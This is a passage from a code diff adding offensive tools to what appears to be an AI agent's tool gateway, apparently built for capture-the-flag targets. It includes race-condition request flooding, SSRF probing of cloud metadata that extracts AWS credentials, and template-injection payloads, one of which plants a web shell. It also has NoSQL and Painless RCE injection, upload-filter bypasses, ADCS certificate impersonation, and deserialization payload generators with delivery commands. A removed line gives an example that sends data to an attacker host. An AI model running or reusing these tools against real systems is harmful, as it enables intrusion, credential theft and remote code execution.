@@ -234,6 +234,120 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         },
     )
 
+    # ── Parallel / Race Condition Tool ────────────────────────────
+    async def parallel_request(
+        urls: str, method: str = "PUT", body: str = "",
+        concurrency: int = 10, delay_ms: int = 0,
+    ) -> ToolResult:
+        """Send concurrent HTTP requests for race condition exploitation.
+
+        Sends multiple identical requests in parallel with configurable
+        concurrency. Used for: Tomcat race condition (WEB-02, CVE-2024-50379),
+        TOCTOU attacks (K8S-03), AdminSDHolder SDProp race (AD-23), and any
+        vulnerability requiring timed concurrent requests.
+        """
+        import asyncio, time, urllib.request, urllib.error, ssl, json as _json
+
+        start = time.perf_counter()
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+
+        url_list = [u.strip() for u in urls.split(",") if u.strip()]
+        if not url_list:
+            elapsed = (time.perf_counter() - start) * 1000
+            return ToolResult(
+                tool_name="parallel_request", success=False,
+                stdout="", stderr="No URLs provided", exit_code=1,
+                elapsed_ms=elapsed,
+            )
+
+        data = body.encode() if body else None
+        results: list[dict] = []
+
+        async def _send_one(u: str, idx: int):
+            """Send a single request and return result."""
+            try:
+                if delay_ms > 0:
+                    await asyncio.sleep(delay_ms / 1000.0 * (idx % concurrency))
+                req = urllib.request.Request(u, data=data, method=method.upper())
+                if data:
+                    req.add_header("Content-Type", "application/octet-stream")
+                loop = asyncio.get_event_loop()
+                resp = await loop.run_in_executor(
+                    None, lambda: urllib.request.urlopen(req, timeout=15, context=ctx)
+                )
+                body_text = resp.read().decode("utf-8", errors="replace")
+                return {
+                    "url": u[:80], "index": idx,
+                    "status": resp.status, "response_len": len(body_text),
+                    "response_preview": body_text[:200],
+                }
+            except urllib.error.HTTPError as e:
+                return {"url": u[:80], "index": idx, "status": e.code, "error": str(e)}
+            except Exception as e:
+                return {"url": u[:80], "index": idx, "error": str(e)[:100]}
+
+        # Send all URLs with specified concurrency
+        sem = asyncio.Semaphore(min(concurrency, 20))
+        async def _with_sem(u, idx):
+            async with sem:
+                return await _send_one(u, idx)
+
+        tasks = [_with_sem(url_list[i % len(url_list)], i)
+                 for i in range(max(len(url_list), concurrency))]
+        # Duplicate if fewer URLs than concurrency (for race condition)
+        if len(url_list) < concurrency:
+            tasks = [_with_sem(url_list[i % len(url_list)], i)
+                     for i in range(concurrency)]
+
+        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
+        for r in batch_results:
+            if isinstance(r, Exception):
+                results.append({"error": str(r)})
+            elif isinstance(r, dict):
+                results.append(r)
+
+        elapsed = (time.perf_counter() - start) * 1000
+        statuses = [r.get("status", 0) for r in results if isinstance(r, dict)]
+        success_count = sum(1 for s in statuses if s in (200, 201, 202, 204))
+        unique_statuses = dict((s, statuses.count(s)) for s in set(statuses))
+
+        import re
+        all_bodies = " ".join(
+            r.get("response_preview", "") for r in results if isinstance(r, dict)
+        )
+        flag_match = re.search(r'flag\{[^}]+\}', all_bodies)
+
+        summary = (
+            f"Parallel {method} requests: {len(results)} sent ({concurrency} concurrent, "
+            f"{delay_ms}ms stagger).\n"
+            f"Status codes: {unique_statuses}\n"
+            f"Successful (2xx): {success_count}/{len(results)}"
+        )
+        if flag_match:
+            summary += f"\nFLAG: {flag_match.group(0)}"
+
+        return ToolResult(
+            tool_name="parallel_request", success=success_count > 0,
+            stdout=summary + "\n" + _json.dumps(results, indent=2),
+            stderr="", exit_code=0 if success_count > 0 else 1,
+            elapsed_ms=elapsed,
+        )
+
+    gateway.register(
+        name="parallel_request",
+        func=parallel_request,
+        description="Send concurrent/parallel HTTP requests for race condition exploitation. Useful for: Tomcat race condition (WEB-02, CVE-2024-50379 — PUT JSP while racing compilation), TOCTOU attacks, file upload races, and any time-of-check-time-of-use vulnerability. Sends multiple identical requests with controllable concurrency and timing stagger.",
+        parameters={
+            "urls": {"type": "string", "description": "Comma-separated target URLs (or single URL — will be duplicated for concurrent requests)"},
+            "method": {"type": "string", "description": "HTTP method: PUT, POST, GET (default: PUT)"},
+            "body": {"type": "string", "description": "Request body content for PUT/POST requests"},
+            "concurrency": {"type": "integer", "description": "Number of concurrent requests (default: 10, max: 20)"},
+            "delay_ms": {"type": "integer", "description": "Stagger delay in milliseconds between request groups (default: 0 — all at once)"},
+        },
+    )
+
     # ── Web fuzzing (ffuf) ──────────────────────────────────────
     gateway.register_shell_tool(
         name="ffuf_fuzz",
@@ -607,11 +721,24 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
                         # Check for flag in response
                         import re
                         flag_match = re.search(r'flag\{[^}]+\}', stdout_s)
+                        # IMDS credential detection: look for AWS/GCP/Azure patterns
+                        creds_found = None
+                        imds_keys = re.findall(r'"AccessKeyId"\s*:\s*"([^"]+)"', stdout_s)
+                        imds_secret = re.findall(r'"SecretAccessKey"\s*:\s*"([^"]+)"', stdout_s)
+                        imds_token = re.findall(r'"Token"\s*:\s*"([^"]+)"', stdout_s)
+                        if imds_keys and imds_secret:
+                            creds_found = {
+                                "type": "aws_iam",
+                                "access_key_id": imds_keys[0],
+                                "secret_access_key": imds_secret[0][:20] + "...",
+                                "has_token": bool(imds_token),
+                            }
                         results.append({
                             "probe": probe_url,
                             "response_len": len(stdout_s),
                             "response_preview": stdout_s[:500],
                             "flag": flag_match.group(0) if flag_match else None,
+                            "credentials_detected": creds_found,
                         })
                         # Stop if flag found
                         if flag_match:
@@ -642,7 +769,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     gateway.register(
         name="ssrf_probe",
         func=ssrf_probe,
-        description="Discover internal services through an SSRF vector. Given an SSRF endpoint URL, probes common internal hosts (localhost, 127.0.0.1, Docker bridge IPs 172.17-18.0.x, host.docker.internal, cloud metadata 169.254.169.254) and ports for accessible services. IMPORTANT: do NOT restrict internal_hosts to 'localhost' alone — services often run on other containers reachable via Docker bridge IPs. Omit internal_hosts entirely to use the comprehensive defaults. When running inside containers, internal services are on Docker bridge IPs, NOT localhost. Automatically extracts flags from responses.",
+        description="Discover internal services through an SSRF vector. Given an SSRF endpoint URL, probes common internal hosts (localhost, 127.0.0.1, Docker bridge IPs 172.17-18.0.x, host.docker.internal, cloud metadata 169.254.169.254) and ports for accessible services. Uses GET by default, but can also try POST for services like IMDS that require it. IMPORTANT: do NOT restrict internal_hosts to 'localhost' alone — services often run on other containers reachable via Docker bridge IPs. Omit internal_hosts entirely to use the comprehensive defaults. When running inside containers, internal services are on Docker bridge IPs, NOT localhost. Automatically detects IMDS credentials (AccessKeyId/SecretAccessKey pattern) and extracts flags from responses.",
         parameters={
             "ssrf_url": {"type": "string", "description": "The SSRF-vulnerable endpoint URL (e.g. 'http://target:10110/fetch')"},
             "url_param": {"type": "string", "description": "URL parameter name for the SSRF query (default 'url')"},
@@ -650,6 +777,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "internal_hosts": {"type": "string", "description": "Comma-separated internal hosts to probe. LEAVE EMPTY to use defaults (covers localhost, Docker IPs 172.17-18.0.x, cloud metadata 169.254.169.254). Do NOT set to 'localhost' alone — this misses Docker-internal services."},
             "ports": {"type": "string", "description": "Comma-separated ports to probe (default: 80,443,8080,5000,3000)"},
             "paths": {"type": "string", "description": "Comma-separated paths to probe (default: /,/flag,/flag.txt,/admin,/api)"},
+            "method": {"type": "string", "description": "HTTP method: GET or POST. Use POST for services like IMDS that require it (default: GET)"},
         },
     )
 
@@ -696,6 +824,16 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "erb": [
                 "<%= File.read('/flag.txt') %>",
                 "<%= IO.popen('cat /flag.txt').readlines() %>",
+            ],
+            "smarty": [
+                "{system('cat /flag.txt')}",
+                "{system('cat /FLAG.txt')}",
+                "{system('id')}",
+                "{mail('x','x','x','x','-OQueueDirectory=/tmp -X/var/www/html/shell.php')}",
+            ],
+            "velocity": [
+                '#set($x="")$x.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cat /flag.txt").waitFor()',
+                '#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getMethod("getRuntime",null).invoke(null,null).exec("cat /flag.txt"))$ex.waitFor()',
             ],
         }
 
@@ -963,6 +1101,97 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         },
         parser=_parse_shell_output,
         timeout=30,
+    )
+
+    # ── Database Credential Testing ─────────────────────────────────
+    async def test_db_credential(
+        host: str, port: int, service_type: str,
+        username: str = "", password: str = "",
+    ) -> ToolResult:
+        """Test credentials against a database service by attempting a basic query.
+
+        Routes to the correct DB client tool based on service_type and attempts
+        a simple query (SELECT 1, PING, etc.) to verify the credentials work.
+        Returns success=True if the connection and query succeed.
+        """
+        import asyncio, time, json as _json
+
+        start = time.perf_counter()
+        service_type = service_type.lower().strip()
+
+        # Map service type to (tool_name, test_query, tool_params)
+        _DB_TEST_MAP: dict[str, tuple[str, dict]] = {
+            "mysql":      ("mysql_query",      {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}),
+            "mariadb":    ("mysql_query",      {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}),
+            "postgresql": ("psql_query",       {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}),
+            "postgres":   ("psql_query",       {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}),
+            "mssql":      ("mssqlclient_query",{"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1"}),
+            "oracle":     ("oracle_query",     {"host": host, "port": port, "user": username, "password": password, "query": "SELECT 1 FROM DUAL"}),
+            "redis":      ("redis_cmd",        {"host": host, "port": port, "command": "PING"}),
+            "mongodb":    ("shell_exec",       {"command": f"echo 'db.runCommand({{ping:1}})' | mongosh mongodb://{username}:{password}@{host}:{port} --quiet 2>&1"}),
+            "elasticsearch": ("elasticsearch_query", {"host": host, "port": port, "query": "_cluster/health"}),
+            "couchdb":    ("couchdb_query",    {"host": host, "port": port, "query": "_all_dbs"}),
+        }
+
+        if service_type not in _DB_TEST_MAP:
+            elapsed = (time.perf_counter() - start) * 1000
+            return ToolResult(
+                tool_name="test_db_credential", success=False,
+                stdout="", stderr=f"Unsupported service type: {service_type}. Supported: {', '.join(sorted(_DB_TEST_MAP))}",
+                exit_code=1, elapsed_ms=elapsed,
+            )
+
+        tool_name, params = _DB_TEST_MAP[service_type]
+        try:
+            # Find the tool function from the gateway
+            if tool_name in gateway.get_tool_names():
+                result = await gateway.call(tool_name, params)
+                elapsed = (time.perf_counter() - start) * 1000
+                stdout = getattr(result, 'stdout', '') or ''
+                stderr = getattr(result, 'stderr', '') or ''
+                success = getattr(result, 'success', False)
+
+                # Check for successful query indicators
+                _ok_patterns = ["ok", "1 row", "pong", "green", "cluster_name"]
+                if success and stdout.strip():
+                    summary = f"[{service_type.upper()}] Credential test: SUCCESS\n{stdout[:500]}"
+                    return ToolResult(
+                        tool_name="test_db_credential", success=True,
+                        stdout=summary, stderr=stderr,
+                        exit_code=0, elapsed_ms=elapsed,
+                    )
+                else:
+                    return ToolResult(
+                        tool_name="test_db_credential", success=False,
+                        stdout=stdout[:300], stderr=stderr or "Connection/query failed",
+                        exit_code=getattr(result, 'exit_code', 1),
+                        elapsed_ms=elapsed,
+                    )
+            else:
+                elapsed = (time.perf_counter() - start) * 1000
+                return ToolResult(
+                    tool_name="test_db_credential", success=False,
+                    stdout="", stderr=f"Tool '{tool_name}' not available for {service_type}",
+                    exit_code=1, elapsed_ms=elapsed,
+                )
+        except Exception as e:
+            elapsed = (time.perf_counter() - start) * 1000
+            return ToolResult(
+                tool_name="test_db_credential", success=False,
+                stdout="", stderr=str(e), exit_code=1, elapsed_ms=elapsed,
+            )
+
+    gateway.register(
+        name="test_db_credential",
+        func=test_db_credential,
+        description="Test credentials against a database service (MySQL, PostgreSQL, MSSQL, Oracle, Redis, MongoDB, Elasticsearch, CouchDB). Attempts a basic query to verify access. Use after discovering DB services via nmap. Credentials that succeed are confirmed valid.",
+        parameters={
+            "host": {"type": "string", "description": "Database host IP or hostname"},
+            "port": {"type": "integer", "description": "Database port number"},
+            "service_type": {"type": "string", "description": "Service type: mysql, postgresql, mssql, oracle, redis, mongodb, elasticsearch, couchdb"},
+            "username": {"type": "string", "description": "Username (leave empty for Redis which is password-only)"},
+            "password": {"type": "string", "description": "Password (leave empty for no-auth attempt)"},
+        },
     )
 
     # ── Linux Privilege Escalation Tools ──────────────────────────
@@ -1430,6 +1659,117 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=30,
     )
+    # ── NoSQL Injection Probe ──────────────────────────────────────
+    async def nosql_inject(
+        target_url: str, param_name: str = "username",
+        method: str = "POST", db_type: str = "mongodb",
+    ) -> ToolResult:
+        """Probe for NoSQL injection vulnerabilities in MongoDB and Elasticsearch.
+
+        Sends $regex/$ne injection payloads for MongoDB and script injection
+        payloads for Elasticsearch.  Detects authentication bypass and data
+        extraction through injection.
+        """
+        import asyncio, time, urllib.request, urllib.parse, urllib.error, ssl, json as _json
+
+        start = time.perf_counter()
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+
+        results: list[dict] = []
+        db_type = db_type.lower().strip()
+
+        if db_type == "mongodb":
+            # MongoDB NoSQL injection payloads
+            payloads: list[tuple[str, dict]] = [
+                ("$ne operator bypass", {"user": {"$ne": ""}, "password": {"$ne": ""}}),
+                ("$regex auth bypass", {"user": {"$regex": ".*"}, "password": {"$regex": ".*"}}),
+                ("$gt operator bypass", {"user": {"$gt": ""}, "password": {"$gt": ""}}),
+                ("$regex user extraction", {"user": {"$regex": "^a.*"}, "password": {"$ne": ""}}),
+                ("$where injection", {"$where": "1"}),
+            ]
+        elif db_type == "elasticsearch":
+            payloads = [
+                ("script_fields injection",
+                 '{"query":{"match_all":{}},"script_fields":{"test":{"script":{"source":"1+1"}}}}'),
+                ("painless execute",
+                 '{"query":{"match_all":{}},"script_fields":{"test":{"script":{"source":"Runtime.getRuntime().exec(\\\\"cat /flag.txt\\\\").getText()","lang":"painless"}}}}'),
+            ]
+        else:
+            elapsed = (time.perf_counter() - start) * 1000
+            return ToolResult(
+                tool_name="nosql_inject", success=False,
+                stdout="", stderr=f"Unsupported DB type: {db_type}. Supported: mongodb, elasticsearch",
+                exit_code=1, elapsed_ms=elapsed,
+            )
+
+        for desc, payload in payloads:
+            try:
+                body = _json.dumps(payload) if isinstance(payload, dict) else payload
+                data = body.encode()
+                if method.upper() == "POST":
+                    req = urllib.request.Request(target_url, data=data)
+                    req.add_header("Content-Type", "application/json")
+                else:
+                    encoded = urllib.parse.quote(_json.dumps(payload))
+                    req = urllib.request.Request(f"{target_url}?{param_name}={encoded}")
+
+                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
+                body_text = resp.read().decode("utf-8", errors="replace")
+
+                # Detect injection success
+                success_indicators = {"success": "true", "token": ":", "flag": "flag{", "admin": "true", "role": "admin"}
+                indicators_found = [k for k, v in success_indicators.items() if v.lower() in body_text.lower()]
+
+                import re
+                flag_match = re.search(r'flag\{[^}]+\}', body_text)
+
+                results.append({
+                    "payload_desc": desc,
+                    "response_len": len(body_text),
+                    "response_preview": body_text[:300],
+                    "indicators": indicators_found,
+                    "flag": flag_match.group(0) if flag_match else None,
+                    "likely_vulnerable": bool(indicators_found or flag_match),
+                })
+
+                if flag_match:
+                    break
+            except urllib.error.HTTPError as e:
+                body = e.read().decode("utf-8", errors="replace") if hasattr(e, 'read') else ""
+                results.append({"payload_desc": desc, "http_error": e.code, "body_preview": body[:200]})
+            except Exception as e:
+                results.append({"payload_desc": desc, "error": str(e)})
+
+        elapsed = (time.perf_counter() - start) * 1000
+        found_vuln = any(r.get("likely_vulnerable") for r in results)
+        found_flag = [r for r in results if r.get("flag")]
+        summary = (
+            f"NoSQL injection probe ({db_type}): "
+            f"{sum(1 for r in results if r.get('likely_vulnerable'))}/{len(results)} payloads succeeded"
+        )
+        if found_flag:
+            summary += f"\nFLAG: {found_flag[0]['flag']}"
+
+        return ToolResult(
+            tool_name="nosql_inject", success=found_vuln,
+            stdout=summary + "\n" + _json.dumps(results, indent=2),
+            stderr="", exit_code=0 if found_vuln else 1, elapsed_ms=elapsed,
+        )
+
+    gateway.register(
+        name="nosql_inject",
+        func=nosql_inject,
+        description="Detect and exploit NoSQL injection in MongoDB ($regex, $ne, $gt, $where) and Elasticsearch (script_fields, Painless RCE). Use on login endpoints or search endpoints that accept JSON input. Automatically extracts flags from responses.",
+        parameters={
+            "target_url": {"type": "string", "description": "Target login/query endpoint URL (e.g. http://target:port/api/login)"},
+            "param_name": {"type": "string", "description": "JSON parameter name to inject (default: username)"},
+            "method": {"type": "string", "description": "HTTP method: POST or GET (default: POST)"},
+            "db_type": {"type": "string", "description": "NoSQL DB type: mongodb or elasticsearch (default: mongodb)"},
+        },
+    )
+
     # ── NoSQL Database Clients ────────────────────────────────────
 
     gateway.register_shell_tool(
@@ -1953,6 +2293,46 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             _ok = (proc.returncode == 0
                    and _http_status not in (0, 400, 401, 403, 404, 405, 500, 502, 503))
 
+            # ── Auto-retry with extension/Content-Type bypasses ──────
+            # When the first upload fails (blocked extension or mime type),
+            # try common bypass techniques automatically.
+            _bypass_attempts = []
+            if not _ok:
+                _bypass_exts = [".php5", ".phtml", ".pht", ".phar", ".shtml",
+                                ".php.jpg", ".php.png", ".inc", ".phps"]
+                _bypass_types = ["application/x-httpd-php", "image/jpeg",
+                                 "text/plain", "application/octet-stream"]
+                # Try alternative extensions
+                _orig_name = filename
+                for _ext in _bypass_exts[:5]:
+                    _alt_name = _orig_name.rsplit(".", 1)[0] + _ext
+                    _bcmd = cmd_args[:]
+                    # Replace the -F filename part
+                    for _j, _arg in enumerate(_bcmd):
+                        if _arg.startswith(f"{field}=@") and ";filename=" in _arg:
+                            _bcmd[_j] = f"{field}=@{tmp_path};filename={_alt_name}"
+                            break
+                    try:
+                        _bp = await asyncio.create_subprocess_exec(
+                            *_bcmd, stdout=asyncio.subprocess.PIPE,
+                            stderr=asyncio.subprocess.PIPE,
+                        )
+                        _bout, _berr = await asyncio.wait_for(
+                            _bp.communicate(), timeout=15,
+                        )
+                        _bs = _bout.decode("utf-8", errors="replace")
+                        _bl = _bs.strip().split("\n")
+                        _bstatus = int(_bl[-1].strip()) if _bl and _bl[-1].strip().isdigit() else 0
+                        if _bstatus in (200, 201, 202, 204, 301, 302):
+                            _ok = True
+                            stdout_s = _bs
+                            stderr_s = _berr.decode("utf-8", errors="replace")
+                            _http_status = _bstatus
+                            stdout_s += f"\n[BYPASS] Extension bypass: {_alt_name} → HTTP {_bstatus}"
+                            break
+                    except Exception:
+                        continue
+
             # ── Auto-retry with common extra_fields patterns ──────────
             # Many plugin upload endpoints require additional POST params
             # (IDs, directories, nonces).  When the first attempt fails
@@ -2314,6 +2694,37 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=60,
     )
+    # ── ADCS Certificate Services attacks ──────────────────────────
+    gateway.register_shell_tool(
+        name="certipy_adcs",
+        command_template="certipy find -u {user} -p '{password}' -dc-ip {dc_ip} -target {ca_server} -vulnerable 2>&1 | head -100",
+        description="Enumerate ADCS for vulnerable certificate templates (ESC1-ESC8). Use when domain enumeration discovers a CA server. ESC1: overly permissive enrollment agent. ESC2: template allows request without signature. ESC3: enrollment agent template without authorization. ESC4: vulnerable ACL on template. ESC6: CA Flag EDITF_ATTRIBUTESUBJECTALTNAME2. ESC8: NTLM relay to HTTP endpoint.",
+        parameters={
+            "user": {"type": "string", "description": "Domain username"},
+            "password": {"type": "string", "description": "Domain password"},
+            "dc_ip": {"type": "string", "description": "Domain controller IP"},
+            "ca_server": {"type": "string", "description": "CA server hostname/IP (discovered via certipy find or ldapsearch)"},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+    gateway.register_shell_tool(
+        name="certipy_req",
+        command_template="certipy req -u {user} -p '{password}' -dc-ip {dc_ip} -target {ca_server} -ca {ca_name} -template {template} -upn {alt_upn} -dns {alt_dns} 2>&1 | head -100",
+        description="Request certificate from ADCS using vulnerable template (ESC1-3 exploitation). Outputs .pfx for PKINIT authentication.",
+        parameters={
+            "user": {"type": "string", "description": "Domain username"},
+            "password": {"type": "string", "description": "Domain password"},
+            "dc_ip": {"type": "string", "description": "Domain controller IP"},
+            "ca_server": {"type": "string", "description": "CA server hostname/IP"},
+            "ca_name": {"type": "string", "description": "CA name from certipy find"},
+            "template": {"type": "string", "description": "Vulnerable template name"},
+            "alt_upn": {"type": "string", "description": "Alternative UPN for impersonation (e.g. Administrator@domain.local)"},
+            "alt_dns": {"type": "string", "description": "Alternative DNS hostname"},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
     gateway.register_shell_tool(
         name="bloodyad_dacl",
         command_template="python3 /opt/bloodyAD/bloodyAD.py -d {domain} -u {user} -p '{password}' --host {target} {action} {target_object} {extra} 2>&1  | head -80",
@@ -2345,16 +2756,188 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     # ── Java Deserialization Tool (WEB-01) ─────────────────────────
 
-    gateway.register_shell_tool(
+    async def ysoserial_generate(
+        command: str = "cat /flag.txt",
+        gadget: str = "auto",
+        target_url: str = "",
+    ) -> ToolResult:
+        """Generate Java deserialization payload with auto gadget selection.
+
+        Tries common ysoserial gadget chains in order: CommonsCollections6,
+        CommonsBeanutils1, Groovy1, Jdk7u21, Spring1. Returns the first
+        successfully generated payload. For use with Tomcat deserialization
+        (WEB-01/CVE-2025-24813) and other Java deserialization endpoints.
+        """
+        import asyncio, time, os, json as _json
+
+        start = time.perf_counter()
+        results: list[dict] = []
+        _gadgets = (
+            ["CommonsCollections6", "CommonsBeanutils1", "Groovy1",
+             "Jdk7u21", "Spring1", "CommonsCollections5", "CommonsCollections4",
+             "CommonsCollections7", "URLDNS"]
+            if gadget == "auto" else [gadget]
+        )
+        _jar_paths = [
+            "/opt/ysoserial-all.jar",
+            "/usr/share/ysoserial/ysoserial-all.jar",
+            os.path.expanduser("~/tools/ysoserial-all.jar"),
+        ]
+        _jar = None
+        for _jp in _jar_paths:
+            if os.path.exists(_jp):
+                _jar = _jp
+                break
+
+        if not _jar:
+            elapsed = (time.perf_counter() - start) * 1000
+            return ToolResult(
+                tool_name="ysoserial_generate", success=False,
+                stdout="", stderr="ysoserial-all.jar not found. Install from https://github.com/frohoff/ysoserial",
+                exit_code=1, elapsed_ms=elapsed,
+            )
+
+        for _g in _gadgets[:6]:
+            try:
+                cmd = f"java -jar {_jar} {_g} '{command}' 2>&1 | head -500"
+                proc = await asyncio.create_subprocess_shell(
+                    cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
+                stdout_s = stdout.decode("utf-8", errors="replace")
+                stderr_s = stderr.decode("utf-8", errors="replace")
+
+                _success = proc.returncode == 0 and len(stdout_s) > 20
+                results.append({
+                    "gadget": _g,
+                    "success": _success,
+                    "payload_len": len(stdout_s),
+                    "payload_preview": stdout_s[:200] if _success else "",
+                    "error": stderr_s[:200] if not _success else "",
+                })
+
+                if _success:
+                    # Also provide delivery guidance
+                    _delivery = (
+                        f"\n\n=== DELIVERY GUIDANCE ===\n"
+                        f"Generated {_g} payload ({len(stdout_s)} bytes).\n"
+                        f"1. Save payload to file: echo '<PAYLOAD>' > /tmp/payload.bin\n"
+                        f"2. For Tomcat (CVE-2025-24813): PUT the payload as session file\n"
+                        f"   curl -X PUT http://TARGET:8080/session -H 'Content-Type: application/octet-stream' --data-binary @/tmp/payload.bin\n"
+                        f"3. Trigger deserialization by GETting the session\n"
+                        f"4. For other deserialization: send as raw body with Content-Type: application/x-java-serialized-object"
+                    )
+                    elapsed = (time.perf_counter() - start) * 1000
+                    return ToolResult(
+                        tool_name="ysoserial_generate", success=True,
+                        stdout=stdout_s[:500] + _delivery,
+                        stderr=stderr_s, exit_code=0, elapsed_ms=elapsed,
+                    )
+            except Exception as e:
+                results.append({"gadget": _g, "error": str(e)})
+
+        elapsed = (time.perf_counter() - start) * 1000
+        return ToolResult(
+            tool_name="ysoserial_generate", success=False,
+            stdout=_json.dumps(results, indent=2),
+            stderr="No gadget chain produced a valid payload",
+            exit_code=1, elapsed_ms=elapsed,
+        )
+
+    gateway.register(
         name="ysoserial_generate",
-        command_template="java -jar /opt/ysoserial-all.jar {gadget} '{command}' 2>&1 | head -200",
-        description="Generate a Java deserialization payload using ysoserial. Used for Tomcat deserialization RCE (WEB-01, CVE-2025-24813) and other Java deserialization vulnerabilities. Choose a gadget chain based on the target's classpath. Common gadgets: CommonsCollections1-7, CommonsBeanutils1, Groovy1, Spring1, Jdk7u21.",
+        func=ysoserial_generate,
+        description="Generate Java deserialization payload using ysoserial. AUTO mode tries CommonsCollections6→Beanutils1→Groovy→Jdk7u21→Spring1 in order. Returns the first valid payload with delivery guidance (Tomcat session PUT, raw body, etc.). For Java deserialization vulnerabilities: WEB-01 (Tomcat CVE-2025-24813), RMI, JMX, JNDI injection.",
         parameters={
-            "gadget": {"type": "string", "description": "ysoserial gadget chain name (e.g. CommonsCollections1, CommonsBeanutils1, Groovy1, Spring1, Jdk7u21)"},
-            "command": {"type": "string", "description": "Command to execute on the target (e.g. 'curl http://attacker/flag')"},
+            "command": {"type": "string", "description": "Command to execute on target (default: 'cat /flag.txt')"},
+            "gadget": {"type": "string", "description": "Gadget chain name, or 'auto' for sequential trial (default: auto)"},
+            "target_url": {"type": "string", "description": "Optional target URL for delivery guidance"},
         },
-        parser=_parse_shell_output,
-        timeout=30,
+    )
+
+    async def php_serialize_generate(
+        class_name: str = "User",
+        properties: str = "username:admin,is_admin:b:1",
+        command: str = "",
+    ) -> ToolResult:
+        """Generate PHP serialized object payload for deserialization attacks.
+
+        Constructs a PHP serialized object string from class name and properties.
+        For use with PHP deserialization vulnerabilities (WEB-17 and similar) where
+        an application calls unserialize() on user-supplied data.
+        """
+        import time, base64, json as _json
+
+        start = time.perf_counter()
+
+        # Parse properties: "name:value,is_admin:b:1,count:i:99"
+        # Types: s:string (default), b:boolean, i:integer, d:float, a:array
+        props_list = []
+        for prop in properties.split(","):
+            prop = prop.strip()
+            if not prop:
+                continue
+            parts = prop.split(":", 2)
+            key = parts[0]
+            if len(parts) == 1:
+                # String value
+                props_list.append({"name": key, "type": "s", "value": ""})
+            elif len(parts) == 2:
+                # String value with content
+                props_list.append({"name": key, "type": "s", "value": parts[1]})
+            elif len(parts) == 3:
+                # Typed value
+                props_list.append({"name": key, "type": parts[1], "value": parts[2]})
+
+        # Build serialized PHP object
+        # Format: O:<class_name_len>:"<class_name>":<prop_count>:{<props>}
+        props_serialized = ""
+        for p in props_list:
+            name = p["name"]
+            typ = p["type"]
+            val = str(p["value"])
+            props_serialized += f's:{len(name)}:"{name}";'
+            if typ == "b":
+                props_serialized += f'b:{1 if val.lower() in ("1","true","yes") else 0};'
+            elif typ == "i":
+                props_serialized += f'i:{val};'
+            elif typ == "d":
+                props_serialized += f'd:{val};'
+            else:  # string
+                props_serialized += f's:{len(val)}:"{val}";'
+
+        serialized = f'O:{len(class_name)}:"{class_name}":{len(props_list)}:{{{props_serialized}}}'
+
+        # Common exploitation payloads
+        _template = ""
+        if command:
+            _template = (
+                f"\n\n=== EXPLOITATION PAYLOADS ===\n"
+                f"1. Auth bypass (set is_admin=true):\n"
+                f"   curl -X POST {{TARGET}} -d 'data={serialized}'\n"
+                f"2. RCE via __destruct/__wakeup (if class calls system/exec):\n"
+                f'   O:{len(class_name)}:"{class_name}":1:{{s:4:"cmd";s:{len(command)}:"{command}";}}\n'
+                f"3. Base64-encoded (for JSON APIs):\n"
+                f"   {base64.b64encode(serialized.encode()).decode()}\n"
+                f"4. URL-encoded:\n"
+                f"   {__import__('urllib.parse').quote(serialized)}"
+            )
+
+        elapsed = (time.perf_counter() - start) * 1000
+        return ToolResult(
+            tool_name="php_serialize_generate", success=True,
+            stdout=f"Serialized PHP object:\n{serialized}\n\nBase64: {base64.b64encode(serialized.encode()).decode()}{_template}",
+            stderr="", exit_code=0, elapsed_ms=elapsed,
+        )
+
+    gateway.register(
+        name="php_serialize_generate",
+        func=php_serialize_generate,
+        description="Generate PHP serialized object payload for PHP deserialization attacks (WEB-17, auth bypass, RCE). Given class name and properties (format: 'key:value,key2:b:1,key3:i:99'), constructs a valid PHP serialized string. Supports types: s=string, b=bool, i=int, d=float. Use with send_payload or curl_get to deliver the payload.",
+        parameters={
+            "class_name": {"type": "string", "description": "PHP class name (e.g. User, Account, Session)"},
+            "properties": {"type": "string", "description": "Comma-separated properties in format 'key:value' or 'key:type:value'. String default, b=bool, i=int. Example: 'username:admin,is_admin:b:1,role:s:admin'"},
+            "command": {"type": "string", "description": "Optional RCE command if the target class has a command execution gadget (__destruct, __wakeup)"},
+        },
     )
 
     # ── AWS Cloud CLI ────────────────────────────────────────────
@@ -2368,6 +2951,213 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
             "action": {"type": "string", "description": "AWS CLI action: ls, cp, sync, list-roles, get-policy, get-role, attach-role-policy, simulate-principal-policy, assume-role, assume-role-with-web-identity, assume-role-with-saml, get-caller-identity, decrypt, list-functions, invoke, create-function, list-queues, receive-message, list-tables, scan, query, describe-organization, list-accounts, list-policies, list-targets-for-policy, describe-policy, detach-policy, disable-policy-type, create-stack, validate-template, describe-stacks, describe-trails, get-trail-status, get-event-selectors, stop-logging"},
